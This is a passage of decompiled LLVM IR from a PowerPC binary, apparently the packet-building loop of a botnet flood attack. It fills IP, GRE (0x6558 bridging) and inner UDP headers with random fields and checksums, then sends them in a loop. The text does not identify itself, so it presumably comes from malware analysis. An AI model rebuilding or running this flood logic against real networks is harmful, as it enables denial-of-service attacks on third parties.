  store i16 %v1_10002a2c, i16* %v3_10002a2c, align 2
  %v0_10002a30 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002a30 = load i32, i32* %r18.global-to-local, align 4
  %v2_10002a30 = icmp slt i32 %v0_10002a30, %v1_10002a30
  %v4_10002a30 = icmp eq i32 %v0_10002a30, %v1_10002a30
  store i1 %v4_10002a30, i1* %cr7_eq.global-to-local, align 1
  %v0_10002a34 = load i32, i32* %r17.global-to-local, align 4
  %v1_10002a34 = trunc i32 %v0_10002a34 to i16
  %v2_10002a34 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002a34 = add i32 %v2_10002a34, 2
  %v4_10002a34 = inttoptr i32 %v3_10002a34 to i16*
  store i16 %v1_10002a34, i16* %v4_10002a34, align 2
  %v0_10002a38 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10002a38, i32* %stack_var_-104, align 4
  br i1 %v2_10002a30, label %dec_label_pc_10002a40, label %dec_label_pc_10002b9c

dec_label_pc_10002a40:                            ; preds = %dec_label_pc_10002a20, %dec_label_pc_100029e4
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268446284, i32* @lr, align 4
  %v2_10002a48 = call i32 @function_1000c548(i32 1510, i32 4)
  store i32 %v2_10002a48, i32* %r3.global-to-local, align 4
  %v3_10002a4c = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002a4c, i32* %r9.global-to-local, align 4
  %v0_10002a50 = load i32, i32* @r31, align 4
  %v1_10002a50 = mul i32 %v0_10002a50, 4
  store i32 %v1_10002a50, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r11.global-to-local, align 4
  %v1_10002a58 = load i32, i32* %r19.global-to-local, align 4
  %v3_10002a58 = add i32 %v1_10002a58, %v1_10002a50
  %v4_10002a58 = inttoptr i32 %v3_10002a58 to i32*
  store i32 %v2_10002a48, i32* %v4_10002a58, align 4
  %v0_10002a5c = load i32, i32* %r9.global-to-local, align 4
  %v1_10002a5c = mul i32 %v0_10002a5c, 4
  store i32 %v1_10002a5c, i32* %r9.global-to-local, align 4
  %v1_10002a60 = load i32, i32* %r19.global-to-local, align 4
  %v2_10002a60 = add i32 %v1_10002a60, %v1_10002a5c
  %v3_10002a60 = inttoptr i32 %v2_10002a60 to i32*
  %v4_10002a60 = load i32, i32* %v3_10002a60, align 4
  store i32 %v4_10002a60, i32* %r31.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10002a68 = inttoptr i32 %v4_10002a60 to i32*
  %v2_10002a68 = load i32, i32* %v1_10002a68, align 4
  store i32 %v2_10002a68, i32* %r0.global-to-local, align 4
  %v1_10002a6c = add i32 %v4_10002a60, 38
  store i32 %v1_10002a6c, i32* %r30.global-to-local, align 4
  %v0_10002a70 = load i32, i32* %r20.global-to-local, align 4
  %v1_10002a70 = trunc i32 %v0_10002a70 to i8
  %v3_10002a70 = add i32 %v4_10002a60, 8
  %v4_10002a70 = inttoptr i32 %v3_10002a70 to i8*
  store i8 %v1_10002a70, i8* %v4_10002a70, align 1
  %v0_10002a74 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002a74 = add i32 %v0_10002a74, 58
  store i32 %v1_10002a74, i32* %r29.global-to-local, align 4
  %v1_10002a78 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10002a78, i32* %r0.global-to-local, align 4
  %v0_10002a7c = load i32, i32* %r24.global-to-local, align 4
  %v1_10002a7c = trunc i32 %v0_10002a7c to i16
  %v2_10002a7c = load i32, i32* %r31.global-to-local, align 4
  %v3_10002a7c = add i32 %v2_10002a7c, 4
  %v4_10002a7c = inttoptr i32 %v3_10002a7c to i16*
  store i16 %v1_10002a7c, i16* %v4_10002a7c, align 2
  %v1_10002a80 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002a80, i32* %r0.global-to-local, align 4
  %v0_10002a84 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002a84 = add i32 %v0_10002a84, 20
  store i32 %v1_10002a84, i32* %r9.global-to-local, align 4
  %v2_10002a88 = inttoptr i32 %v0_10002a84 to i32*
  store i32 %v1_10002a80, i32* %v2_10002a88, align 4
  %v0_10002a8c = load i32, i32* %r31.global-to-local, align 4
  %v1_10002a8c = add i32 %v0_10002a8c, 24
  store i32 %v1_10002a8c, i32* %r11.global-to-local, align 4
  %v0_10002a90 = load i32, i32* %r14.global-to-local, align 4
  %v1_10002a90 = trunc i32 %v0_10002a90 to i8
  %v3_10002a90 = add i32 %v0_10002a8c, 1
  %v4_10002a90 = inttoptr i32 %v3_10002a90 to i8*
  store i8 %v1_10002a90, i8* %v4_10002a90, align 1
  %v0_10002a94 = load i32, i32* %r22.global-to-local, align 4
  %v1_10002a94 = trunc i32 %v0_10002a94 to i16
  %v2_10002a94 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002a94 = add i32 %v2_10002a94, 2
  %v4_10002a94 = inttoptr i32 %v3_10002a94 to i16*
  store i16 %v1_10002a94, i16* %v4_10002a94, align 2
  %v0_10002a98 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002a98, label %dec_label_pc_10002aa4, label %dec_label_pc_10002a9c

dec_label_pc_10002a9c:                            ; preds = %dec_label_pc_10002a40
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10002aa0 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002aa0 = add i32 %v2_10002aa0, 6
  %v4_10002aa0 = inttoptr i32 %v3_10002aa0 to i16*
  store i16 16384, i16* %v4_10002aa0, align 2
  br label %dec_label_pc_10002aa4

dec_label_pc_10002aa4:                            ; preds = %dec_label_pc_10002a40, %dec_label_pc_10002a9c
  %v2_10002aa8 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002aa8 = add i32 %v2_10002aa8, 9
  %v4_10002aa8 = inttoptr i32 %v3_10002aa8 to i8*
  store i8 47, i8* %v4_10002aa8, align 1
  store i32 25944, i32* %r0.global-to-local, align 4
  %v2_10002ab0 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002ab0 = add i32 %v2_10002ab0, 2
  %v4_10002ab0 = inttoptr i32 %v3_10002ab0 to i16*
  store i16 25944, i16* %v4_10002ab0, align 2
  %v2_10002ab8 = load i32, i32* %r11.global-to-local, align 4
  %v3_10002ab8 = add i32 %v2_10002ab8, 12
  %v4_10002ab8 = inttoptr i32 %v3_10002ab8 to i16*
  store i16 2048, i16* %v4_10002ab8, align 2
  %v3_10002abc = load i32, i32* %stack_var_-104, align 4
  store i32 %v5_1000297c, i32* %r11.global-to-local, align 4
  %v1_10002ac4 = mul i32 %v3_10002abc, 24
  store i32 %v1_10002ac4, i32* %r9.global-to-local, align 4
  %v0_10002ac8 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002ac8 = add i32 %v0_10002ac8, 38
  %v2_10002ac8 = inttoptr i32 %v1_10002ac8 to i32*
  %v3_10002ac8 = load i32, i32* %v2_10002ac8, align 4
  store i32 %v3_10002ac8, i32* %r0.global-to-local, align 4
  %v2_10002acc = add i32 %v0_10002ac8, 12
  %v3_10002acc = inttoptr i32 %v2_10002acc to i32*
  store i32 %v5_1000297c, i32* %v3_10002acc, align 4
  store i32 4, i32* %r11.global-to-local, align 4
  %v0_10002ad4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002ad4 = load i32, i32* %r25.global-to-local, align 4
  %v2_10002ad4 = add i32 %v1_10002ad4, %v0_10002ad4
  store i32 %v2_10002ad4, i32* %r9.global-to-local, align 4
  %v1_10002ad8 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10002ad8, i32* %r0.global-to-local, align 4
  %v0_10002adc = load i32, i32* %r9.global-to-local, align 4
  %v1_10002adc = add i32 %v0_10002adc, 16
  %v2_10002adc = inttoptr i32 %v1_10002adc to i32*
  %v3_10002adc = load i32, i32* %v2_10002adc, align 4
  store i32 %v3_10002adc, i32* %r11.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10002ae4 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002ae4, i32* %r0.global-to-local, align 4
  %v1_10002ae8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002ae8 = add i32 %v1_10002ae8, 38
  %v3_10002ae8 = inttoptr i32 %v2_10002ae8 to i32*
  store i32 %v1_10002ae4, i32* %v3_10002ae8, align 4
  %v0_10002aec = load i32, i32* %r11.global-to-local, align 4
  %v1_10002aec = load i32, i32* %r31.global-to-local, align 4
  %v2_10002aec = add i32 %v1_10002aec, 16
  %v3_10002aec = inttoptr i32 %v2_10002aec to i32*
  store i32 %v0_10002aec, i32* %v3_10002aec, align 4
  %v0_10002af0 = load i32, i32* %r14.global-to-local, align 4
  %v1_10002af0 = trunc i32 %v0_10002af0 to i8
  %v2_10002af0 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002af0 = add i32 %v2_10002af0, 1
  %v4_10002af0 = inttoptr i32 %v3_10002af0 to i8*
  store i8 %v1_10002af0, i8* %v4_10002af0, align 1
  %v0_10002af4 = load i32, i32* %r26.global-to-local, align 4
  %v1_10002af4 = trunc i32 %v0_10002af4 to i16
  %v2_10002af4 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002af4 = add i32 %v2_10002af4, 2
  %v4_10002af4 = inttoptr i32 %v3_10002af4 to i16*
  store i16 %v1_10002af4, i16* %v4_10002af4, align 2
  %v0_10002af8 = load i32, i32* %r27.global-to-local, align 4
  %v1_10002af8 = trunc i32 %v0_10002af8 to i16
  %v2_10002af8 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002af8 = add i32 %v2_10002af8, 4
  %v4_10002af8 = inttoptr i32 %v3_10002af8 to i16*
  store i16 %v1_10002af8, i16* %v4_10002af8, align 2
  %v0_10002afc = load i32, i32* %r20.global-to-local, align 4
  %v1_10002afc = trunc i32 %v0_10002afc to i8
  %v2_10002afc = load i32, i32* %r30.global-to-local, align 4
  %v3_10002afc = add i32 %v2_10002afc, 8
  %v4_10002afc = inttoptr i32 %v3_10002afc to i8*
  store i8 %v1_10002afc, i8* %v4_10002afc, align 1
  %v0_10002b00 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002b00, label %dec_label_pc_10002b0c, label %dec_label_pc_10002b04

dec_label_pc_10002b04:                            ; preds = %dec_label_pc_10002aa4
  store i32 16384, i32* %r11.global-to-local, align 4
  %v2_10002b08 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002b08 = add i32 %v2_10002b08, 6
  %v4_10002b08 = inttoptr i32 %v3_10002b08 to i16*
  store i16 16384, i16* %v4_10002b08, align 2
  br label %dec_label_pc_10002b0c

dec_label_pc_10002b0c:                            ; preds = %dec_label_pc_10002aa4, %dec_label_pc_10002b04
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_10002b10 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002b10 = add i32 %v2_10002b10, 9
  %v4_10002b10 = inttoptr i32 %v3_10002b10 to i8*
  store i8 17, i8* %v4_10002b10, align 1
  %v0_10002b14 = call i32 @function_10007ca8()
  store i32 %v0_10002b14, i32* %r3.global-to-local, align 4
  %v1_10002b18 = add i32 %v0_10002b14, -1024
  store i32 %v1_10002b18, i32* %r0.global-to-local, align 4
  %v1_10002b1c = load i32, i32* %r30.global-to-local, align 4
  %v2_10002b1c = add i32 %v1_10002b1c, 12
  %v3_10002b1c = inttoptr i32 %v2_10002b1c to i32*
  store i32 %v0_10002b14, i32* %v3_10002b1c, align 4
  %v0_10002b20 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002b20 = sub i32 -1, %v0_10002b20
  store i32 %v1_10002b20, i32* %r0.global-to-local, align 4
  %v0_10002b24 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002b24, label %dec_label_pc_10002b28, label %dec_label_pc_10002a18

dec_label_pc_10002b28:                            ; preds = %dec_label_pc_10002b0c
  %v1_10002b28 = load i32, i32* %r30.global-to-local, align 4
  %v2_10002b28 = add i32 %v1_10002b28, 16
  %v3_10002b28 = inttoptr i32 %v2_10002b28 to i32*
  store i32 %v1_10002b20, i32* %v3_10002b28, align 4
  br label %dec_label_pc_10002a20

dec_label_pc_10002b30:                            ; preds = %dec_label_pc_100029a0
  %v0_10002b30 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10002b30, i32* %r3.global-to-local, align 4
  store i32 268446520, i32* @lr, align 4
  %v0_10002b34 = call i32 @function_1000b3f0()
  store i32 %v0_10002b34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002b38

dec_label_pc_10002b38:                            ; preds = %dec_label_pc_1000280c, %dec_label_pc_10002b30
  store i32 %v0_10002824, i32* %r0.global-to-local, align 4
  %v1_10002b4c = call %0 @__asm_mtcrf(i32 56, i32 %v0_10002814)
  store i32 %v0_10002858, i32* %r28.global-to-local, align 4
  store i32 %v0_10002860, i32* %r29.global-to-local, align 4
  store i32 %v0_10002868, i32* %r30.global-to-local, align 4
  store i32 %v0_1000286c, i32* %r31.global-to-local, align 4
  %v0_10002b94 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10002b94

dec_label_pc_10002b98:                            ; preds = %dec_label_pc_100029c4
  %v3_10002b98 = icmp eq i32 %v1_100029dc, 0
  store i1 %v3_10002b98, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_10002b9c

dec_label_pc_10002b9c:                            ; preds = %dec_label_pc_10002a20, %dec_label_pc_10002b98
  store i32 %v5_1000297c, i32* %r0.global-to-local, align 4
  %v0_10002ba0 = load i32, i32* %r21.global-to-local, align 4
  %v3_10002ba0 = icmp eq i32 %v0_10002ba0, 0
  store i1 %v3_10002ba0, i1* %cr2_eq.global-to-local, align 1
  %v2_10002ba4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10002ba4, i32* %r14.global-to-local, align 4
  %v0_10002ba8 = load i32, i32* %r15.global-to-local, align 4
  %v1_10002ba8 = add i32 %v0_10002ba8, 8
  store i32 %v1_10002ba8, i32* %r21.global-to-local, align 4
  %v3_10002bac = icmp eq i32 %v5_1000297c, -1
  store i1 %v3_10002bac, i1* %cr7_eq.global-to-local, align 1
  %v1_10002bb0 = add i32 %v0_10002ba8, 66
  store i32 %v1_10002bb0, i32* %r22.global-to-local, align 4
  %v0_10002bb4 = call i32 @__asm_mfcr()
  store i32 %v0_10002bb4, i32* %r3.global-to-local, align 4
  %v1_10002bb8 = mul i32 %v0_10002bb4, 268435456
  store i32 %v1_10002bb8, i32* %r20.global-to-local, align 4
  %v2_10002c4c = ptrtoint i32* %stack_var_-100 to i32
  %v2_10002c70 = ptrtoint i32* %stack_var_-92 to i32
  %v2_10002c80 = ptrtoint i32* %stack_var_-90 to i32
  %v0_10002bbc.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10002bbc.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_10002bbc.outer

dec_label_pc_10002bbc.outer:                      ; preds = %dec_label_pc_10002d20, %dec_label_pc_10002b9c
  %v1_10002bbc.ph = phi i1 [ %v1_10002bbc.pre, %dec_label_pc_10002b9c ], [ %v1_10002d20, %dec_label_pc_10002d20 ]
  %v0_10002bbc.ph = phi i1 [ %v0_10002bbc.pre, %dec_label_pc_10002b9c ], [ %v0_10002d20, %dec_label_pc_10002d20 ]
  %v2_10002bbc = or i1 %v1_10002bbc.ph, %v0_10002bbc.ph
  br label %dec_label_pc_10002bbc

dec_label_pc_10002bbc:                            ; preds = %dec_label_pc_10002bbc.outer, %dec_label_pc_10002bbc
  br i1 %v2_10002bbc, label %dec_label_pc_10002bbc, label %dec_label_pc_10002bc0

dec_label_pc_10002bc0:                            ; preds = %dec_label_pc_10002bbc, %dec_label_pc_10002d20
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10002bd0

dec_label_pc_10002bd0:                            ; preds = %dec_label_pc_10002c90, %dec_label_pc_10002bc0
  %v0_10002bd0 = phi i32 [ %v1_10002d10, %dec_label_pc_10002c90 ], [ 0, %dec_label_pc_10002bc0 ]
  %v1_10002bd0 = mul i32 %v0_10002bd0, 24
  store i32 %v1_10002bd0, i32* %r0.global-to-local, align 4
  %v1_10002bd4 = mul i32 %v0_10002bd0, 4
  store i32 %v1_10002bd4, i32* %r11.global-to-local, align 4
  %v1_10002bd8 = load i32, i32* %r19.global-to-local, align 4
  %v2_10002bd8 = add i32 %v1_10002bd8, %v1_10002bd4
  %v3_10002bd8 = inttoptr i32 %v2_10002bd8 to i32*
  %v4_10002bd8 = load i32, i32* %v3_10002bd8, align 4
  store i32 %v4_10002bd8, i32* %r28.global-to-local, align 4
  %v1_10002bdc = load i32, i32* %r25.global-to-local, align 4
  %v2_10002bdc = add i32 %v1_10002bdc, %v1_10002bd0
  %v1_10002be0 = add i32 %v2_10002bdc, 20
  %v2_10002be0 = inttoptr i32 %v1_10002be0 to i8*
  %v3_10002be0 = load i8, i8* %v2_10002be0, align 1
  %v4_10002be0 = zext i8 %v3_10002be0 to i32
  store i32 %v4_10002be0, i32* %r9.global-to-local, align 4
  %v1_10002be4 = add i32 %v4_10002bd8, 24
  store i32 %v1_10002be4, i32* @r30, align 4
  %v1_10002be8 = add i32 %v4_10002bd8, 38
  store i32 %v1_10002be8, i32* @r31, align 4
  %v1_10002bec = add i32 %v4_10002bd8, 58
  store i32 %v1_10002bec, i32* %r27.global-to-local, align 4
  %v3_10002bf0 = icmp eq i8 %v3_10002be0, 31
  store i1 %v3_10002bf0, i1* %cr7_eq.global-to-local, align 1
  %tmp39 = icmp ult i8 %v3_10002be0, 32
  br i1 %tmp39, label %dec_label_pc_10002d28, label %dec_label_pc_10002bf8

dec_label_pc_10002bf8:                            ; preds = %dec_label_pc_10002bd0
  %v0_10002bf8 = load i32, i32* %r20.global-to-local, align 4
  %v1_10002bf8 = mul i32 %v0_10002bf8, 16
  %v2_10002bf8 = udiv i32 %v0_10002bf8, 268435456
  %v3_10002bf8 = or i32 %v2_10002bf8, %v1_10002bf8
  store i32 %v3_10002bf8, i32* %r20.global-to-local, align 4
  %v1_10002bfc = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002bf8)
  %v1_10002c00 = mul nuw i32 %v2_10002bf8, 268435456
  %v2_10002c00 = urem i32 %v0_10002bf8, 268435456
  %v3_10002c00 = or i32 %v1_10002c00, %v2_10002c00
  store i32 %v3_10002c00, i32* %r20.global-to-local, align 4
  %v0_10002c04 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002c04, label %dec_label_pc_10002d5c, label %dec_label_pc_10002c08

dec_label_pc_10002c08:                            ; preds = %dec_label_pc_10002d28, %dec_label_pc_10002bf8
  store i32 65535, i32* @r29, align 4
  %v0_10002c10 = load i32, i32* %r24.global-to-local, align 4
  %v4_10002c10 = icmp eq i32 %v0_10002c10, 65535
  store i1 %v4_10002c10, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002c10, label %dec_label_pc_10002d74, label %dec_label_pc_10002c18

dec_label_pc_10002c18:                            ; preds = %dec_label_pc_10002d5c, %dec_label_pc_10002c08
  %v1_10002c18 = phi i32 [ %v1_10002d6c, %dec_label_pc_10002d5c ], [ 65535, %dec_label_pc_10002c08 ]
  %v0_10002c18 = load i32, i32* %r16.global-to-local, align 4
  %v4_10002c18 = icmp eq i32 %v0_10002c18, %v1_10002c18
  store i1 %v4_10002c18, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002c18, label %dec_label_pc_10002d94, label %dec_label_pc_10002c20

dec_label_pc_10002c20:                            ; preds = %dec_label_pc_10002d74.dec_label_pc_10002c20_crit_edge, %dec_label_pc_10002c18
  %v1_10002c20 = phi i32 [ %v1_10002c20.pre, %dec_label_pc_10002d74.dec_label_pc_10002c20_crit_edge ], [ %v1_10002c18, %dec_label_pc_10002c18 ]
  %v0_10002c20 = load i32, i32* %r17.global-to-local, align 4
  %v4_10002c20 = icmp eq i32 %v0_10002c20, %v1_10002c20
  store i1 %v4_10002c20, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002c20, label %dec_label_pc_10002da4, label %dec_label_pc_10002c28

dec_label_pc_10002c28:                            ; preds = %dec_label_pc_10002d94, %dec_label_pc_10002c20
  %v0_10002c28 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002c28, label %dec_label_pc_10002db0, label %dec_label_pc_10002c2c

dec_label_pc_10002c2c:                            ; preds = %dec_label_pc_10002da4, %dec_label_pc_10002c28
  %v0_10002c2c = load i32, i32* %r28.global-to-local, align 4
  %v1_10002c2c = add i32 %v0_10002c2c, 16
  %v2_10002c2c = inttoptr i32 %v1_10002c2c to i32*
  %v3_10002c2c = load i32, i32* %v2_10002c2c, align 4
  store i32 %v3_10002c2c, i32* %r0.global-to-local, align 4
  %v1_10002c30 = load i32, i32* @r31, align 4
  %v2_10002c30 = add i32 %v1_10002c30, 16
  %v3_10002c30 = inttoptr i32 %v2_10002c30 to i32*
  store i32 %v3_10002c2c, i32* %v3_10002c30, align 4
  br label %dec_label_pc_10002c34

dec_label_pc_10002c34:                            ; preds = %dec_label_pc_10002db0, %dec_label_pc_10002c2c
  %v0_10002c34 = call i32 @function_10007ca8()
  store i32 %v0_10002c34, i32* %r3.global-to-local, align 4
  store i32 %v0_10002c34, i32* %stack_var_-100, align 4
  %v0_10002c3c = call i32 @function_10007ca8()
  store i32 %v0_10002c3c, i32* %r3.global-to-local, align 4
  store i32 %v0_10002c3c, i32* %stack_var_-96, align 4
  %v0_10002c44 = call i32 @function_10007ca8()
  store i32 %v0_10002c44, i32* %stack_var_-92, align 4
  %v0_10002c50 = load i32, i32* @r30, align 4
  store i32 %v0_10002c50, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002c5c.72 to i32), i32* @lr, align 4
  %v3_10002c58 = call i32 @function_1000abe8(i32 %v0_10002c50, i32 %v2_10002c4c, i32 4)
  %v0_10002c5c = load i32, i32* @r30, align 4
  %v1_10002c5c = add i32 %v0_10002c5c, 6
  store i32 %v1_10002c5c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002c6c.73 to i32), i32* @lr, align 4
  %v3_10002c68 = call i32 @function_1000abe8(i32 %v1_10002c5c, i32 %v2_10002ba4, i32 4)
  %v0_10002c6c = load i32, i32* @r30, align 4
  %v1_10002c6c = add i32 %v0_10002c6c, 4
  store i32 %v1_10002c6c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002c7c.74 to i32), i32* @lr, align 4
  %v3_10002c78 = call i32 @function_1000abe8(i32 %v1_10002c6c, i32 %v2_10002c70, i32 2)
  %v0_10002c7c = load i32, i32* @r30, align 4
  %v1_10002c7c = add i32 %v0_10002c7c, 10
  store i32 %v1_10002c7c, i32* %r3.global-to-local, align 4
  store i32 268446860, i32* @lr, align 4
  %v3_10002c88 = call i32 @function_1000abe8(i32 %v1_10002c7c, i32 %v2_10002c80, i32 2)
  store i32 %v3_10002c88, i32* %r3.global-to-local, align 4
  %v0_10002c8c = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002c8c, label %dec_label_pc_10002c90, label %dec_label_pc_10002dbc

dec_label_pc_10002c90:                            ; preds = %dec_label_pc_10002c34, %dec_label_pc_10002dbc
  %v0_10002c90 = load i32, i32* %r26.global-to-local, align 4
  %v1_10002c90 = trunc i32 %v0_10002c90 to i16
  %v2_10002c90 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002c90 = add i32 %v2_10002c90, 10
  %v4_10002c90 = inttoptr i32 %v3_10002c90 to i16*
  store i16 %v1_10002c90, i16* %v4_10002c90, align 2
  %v0_10002c98 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10002c98, i32* @r3, align 4
  %v2_10002c9c = call i32 @function_100060d4(i32 %v0_10002c98, i32 20)
  %v3_10002c9c = trunc i32 %v2_10002c9c to i16
  %v4_10002ca4 = add i32 %v0_10002c98, 10
  %v5_10002ca4 = inttoptr i32 %v4_10002ca4 to i16*
  store i16 %v3_10002c9c, i16* %v5_10002ca4, align 2
  %v0_10002ca8 = load i32, i32* @r31, align 4
  store i32 %v0_10002ca8, i32* @r3, align 4
  %v0_10002cac = load i32, i32* %r26.global-to-local, align 4
  %v1_10002cac = trunc i32 %v0_10002cac to i16
  %v3_10002cac = add i32 %v0_10002ca8, 10
  %v4_10002cac = inttoptr i32 %v3_10002cac to i16*
  store i16 %v1_10002cac, i16* %v4_10002cac, align 2
  %v2_10002cb0 = call i32 @function_100060d4(i32 %v0_10002ca8, i32 20)
  %v3_10002cb0 = trunc i32 %v2_10002cb0 to i16
  %v0_10002cb4 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10002cb4, i32* @r4, align 4
  %v3_10002cb8 = load i32, i32* @r31, align 4
  %v4_10002cb8 = add i32 %v3_10002cb8, 10
  %v5_10002cb8 = inttoptr i32 %v4_10002cb8 to i16*
  store i16 %v3_10002cb0, i16* %v5_10002cb8, align 2
  %v0_10002cbc = load i32, i32* %r21.global-to-local, align 4
  %v0_10002cc0 = load i32, i32* %r26.global-to-local, align 4
  %v1_10002cc0 = trunc i32 %v0_10002cc0 to i16
  %v2_10002cc0 = load i32, i32* %r27.global-to-local, align 4
  %v3_10002cc0 = add i32 %v2_10002cc0, 6
  %v4_10002cc0 = inttoptr i32 %v3_10002cc0 to i16*
  store i16 %v1_10002cc0, i16* %v4_10002cc0, align 2
  %v0_10002cc4 = load i32, i32* @r31, align 4
  store i32 %v0_10002cc4, i32* %r3.global-to-local, align 4
  %v0_10002cc8 = load i32, i32* %r27.global-to-local, align 4
  %v1_10002cc8 = add i32 %v0_10002cc8, 4
  %v2_10002cc8 = inttoptr i32 %v1_10002cc8 to i16*
  %v3_10002cc8 = load i16, i16* %v2_10002cc8, align 2
  %v4_10002cc8 = zext i16 %v3_10002cc8 to i32
  %v4_10002ccc = call i32 @function_10006138(i32 %v0_10002cc4, i32 %v0_10002cb4, i32 %v4_10002cc8, i32 %v0_10002cbc)
  %v5_10002ccc = trunc i32 %v4_10002ccc to i16
  store i32 %v4_10002ccc, i32* %r3.global-to-local, align 4
  %v3_10002cd0 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002cd0, i32* %r0.global-to-local, align 4
  %v0_10002cd4 = load i32, i32* %r28.global-to-local, align 4
  %v1_10002cd4 = add i32 %v0_10002cd4, 16
  %v2_10002cd4 = inttoptr i32 %v1_10002cd4 to i32*
  %v3_10002cd4 = load i32, i32* %v2_10002cd4, align 4
  store i32 %v3_10002cd4, i32* %r11.global-to-local, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_10002cdc = mul i32 %v3_10002cd0, 24
  store i32 %v1_10002cdc, i32* %r0.global-to-local, align 4
  %v3_10002ce0 = load i32, i32* %r27.global-to-local, align 4
  %v4_10002ce0 = add i32 %v3_10002ce0, 6
  %v5_10002ce0 = inttoptr i32 %v4_10002ce0 to i16*
  store i16 %v5_10002ccc, i16* %v5_10002ce0, align 2
  %v0_10002ce4 = load i32, i32* %r28.global-to-local, align 4
  %v0_10002ce8 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10002ce8, i32* %r3.global-to-local, align 4
  %v0_10002cec = load i32, i32* %r0.global-to-local, align 4
  %v1_10002cec = load i32, i32* %r25.global-to-local, align 4
  %v2_10002cec = add i32 %v1_10002cec, %v0_10002cec
  %v0_10002cf0 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002cf0 = trunc i32 %v0_10002cf0 to i16
  %v5_10002cf0 = inttoptr i32 %v2_10002cec to i16*
  store i16 %v3_10002cf0, i16* %v5_10002cf0, align 2
  %v0_10002cf4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10002cf4 = add i32 %v2_10002cec, 4
  %v3_10002cf4 = inttoptr i32 %v2_10002cf4 to i32*
  store i32 %v0_10002cf4, i32* %v3_10002cf4, align 4
  %v0_10002cf8 = load i32, i32* %r22.global-to-local, align 4
  %v0_10002cfc = load i32, i32* %r26.global-to-local, align 4
  %v1_10002cfc = trunc i32 %v0_10002cfc to i16
  %v3_10002cfc = add i32 %v2_10002cec, 2
  %v4_10002cfc = inttoptr i32 %v3_10002cfc to i16*
  store i16 %v1_10002cfc, i16* %v4_10002cfc, align 2
  store i32 268446988, i32* @lr, align 4
  %v6_10002d08 = call i32 @function_1000c140(i32 %v0_10002ce8, i32 %v0_10002ce4, i32 %v0_10002cf8, i32 16384, i32 %v2_10002cec, i32 16)
  store i32 %v6_10002d08, i32* %r3.global-to-local, align 4
  %v3_10002d0c = load i32, i32* %stack_var_-104, align 4
  %v1_10002d10 = add i32 %v3_10002d0c, 1
  store i32 %v1_10002d10, i32* %r9.global-to-local, align 4
  %v1_10002d14 = load i32, i32* %r18.global-to-local, align 4
  %v2_10002d14 = icmp slt i32 %v1_10002d10, %v1_10002d14
  %v4_10002d14 = icmp eq i32 %v1_10002d10, %v1_10002d14
  store i1 %v4_10002d14, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10002d10, i32* %stack_var_-104, align 4
  br i1 %v2_10002d14, label %dec_label_pc_10002bd0, label %dec_label_pc_10002d20

dec_label_pc_10002d20:                            ; preds = %dec_label_pc_10002c90
  %v0_10002d20 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10002d20 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10002d20 = or i1 %v0_10002d20, %v1_10002d20
